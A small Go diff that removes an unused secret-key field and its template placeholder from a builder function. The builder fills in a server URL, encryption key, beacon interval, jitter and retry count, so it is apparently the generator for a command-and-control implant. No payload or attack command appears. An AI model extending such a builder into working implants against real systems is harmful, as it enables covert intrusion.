@@ -19,7 +19,6 @@ import (
 type CConfig struct {
 	ServerURL    string
 	EncKey       string
-	SecKey       string // currently reserved
 	InstanceSalt string // if empty, generated randomly
 
 	IntervalSec  int
@@ -152,8 +151,7 @@ func BuildC(cfg *CConfig) (*Result, error) {
 	replacements := map[string]string{
 		"@@SERVER_URL@@":     cfg.ServerURL,
 		"@@ENC_KEY@@":        cfg.EncKey,
-		"@@SEC_KEY@@":        cfg.SecKey,
-		"@@INSTANCE_SALT@@":  cfg.InstanceSalt,
+"@@INSTANCE_SALT@@":  cfg.InstanceSalt,
 		"@@INTERVAL@@":       fmt.Sprintf("%d", cfg.IntervalSec),
 		"@@JITTER@@":         fmt.Sprintf("%d", cfg.JitterPct),
 		"@@MAX_RETRIES@@":    fmt.Sprintf("%d", cfg.MaxRetries),
